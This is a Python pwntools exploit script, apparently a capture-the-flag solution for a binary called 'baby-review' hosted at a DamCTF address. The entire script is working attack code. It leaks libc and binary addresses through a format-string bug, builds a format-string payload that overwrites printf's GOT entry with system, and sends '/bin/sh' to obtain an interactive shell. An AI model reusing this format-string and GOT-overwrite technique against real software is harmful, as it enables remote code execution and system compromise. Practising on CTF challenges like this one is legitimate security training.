#!/usr/bin/env python3
from pwn import *
elf = ELF("./baby-review_patched")
libc = ELF("./given/libc.so.6")
ld = ELF("./ld-2.35.so")
context.arch = "amd64"

capital_map = {
        "Ping": "Pong",
        "Tanzania": "Dodoma",
        "Afghanistan": "Kabul",
        "Lebanon": "Beirut",
        "Germany": "Berlin",
        "Mexico": "Mexico City",
        "India": "New Delhi",
        "Netherlands": "Amsterdam",
        "Iran": "Tehran"
        }

def conn():
    if args.REMOTE:
        p = remote("chals.damctf.xyz", 30888)
    else:
        p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
        if args.D:
            gdb.attach(p)
    return p

def answer_capital(p):
    p.recvuntil(b"What is the capital of ")
    s = p.recvline()
    country = s[:s.find(b"?")]
    capital = capital_map[country.decode()]
    p.sendline(capital.encode())

def probe_recursive():
    p = conn()
    answer_capital(p)

    p.recvuntil(b"What would you like to do?")
    p.sendline(b"5")

    p.recvuntil(b"Enter your movie link here and I'll add it to the list")
    p.sendline(b"AAAAAAAA" + b"%p"*((300 - 8) // 2))

    p.recvuntil(b"What would you like to do?")
    p.sendline(b"2")

    p.recvuntil(b"Here's a few movies to watch")
    p.recvuntil(b"https://www.youtube.com/watch?v=Icx4xul9LEE\n")
    leak = p.recvline()
    print(leak)
    leak_arr = leak.split(b"0x")
    idx = leak_arr.index(b"4141414141414141")
    print(idx)

def exploit():
    p = conn()
    answer_capital(p)
    libc_rand_addr = leak(b"%3$p", p)
    libc.address = + libc_rand_addr - 0x7f3cde5afa37 + 0x7f3cde49b000
    print("libc", hex(libc.address))
    print("lbic_system", hex(libc.symbols["system"]))

    data_rand_addr = leak(b"%9$p", p)
    got_printf = data_rand_addr - 0x555555555580 + 0x555555558020
    writes = {got_printf: libc.symbols["system"]}
    print("got_printf", hex(got_printf))
    payload = fmtstr_payload(10, writes)

    if b"%n" in payload:
        print("no %n")
        quit()

    p.recvuntil(b"What would you like to do?")
    p.sendline(b"5")
    p.recvuntil(b"Enter your movie link here and I'll add it to the list")
    p.send(payload)
    p.recvuntil(b"What would you like to do?")
    p.sendline(b"2")


    p.recvuntil(b"What would you like to do?")
    p.sendline(b"5")
    p.recvuntil(b"Enter your movie link here and I'll add it to the list")
    p.sendline(b"/bin/sh\x00")
    p.sendline(b"2")

    p.interactive()


def leak(fstr, p):
    p.recvuntil(b"What would you like to do?")
    p.sendline(b"5")

    p.recvuntil(b"Enter your movie link here and I'll add it to the list")
    p.sendline(fstr)

    p.recvuntil(b"What would you like to do?")
    p.sendline(b"2")

    p.recvuntil(b"Here's a few movies to watch")
    p.recvuntil(b"https://www.youtube.com/watch?v=Icx4xul9LEE\n")
    leak_str = p.recvline().strip()
    leak_addr = int(leak_str, 16)
    print("leak:", hex(leak_addr))
    return leak_addr

if __name__ == "__main__":
    exploit()
